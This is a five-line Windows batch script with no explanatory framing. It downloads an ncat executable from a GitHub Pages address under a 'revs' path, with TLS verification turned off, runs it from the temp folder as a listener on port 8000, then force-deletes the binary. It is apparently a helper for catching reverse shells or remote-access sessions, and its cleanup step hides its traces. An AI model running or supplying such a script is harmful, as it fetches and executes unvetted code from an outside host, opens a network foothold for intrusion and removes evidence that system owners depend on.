@echo off
curl -kLs stivengiv.github.io/revs/ncat.exe -o %temp%\nc.exe
%temp%\nc -nlvp 8000
del /s /f /q %temp%\nc.exe
exit /b
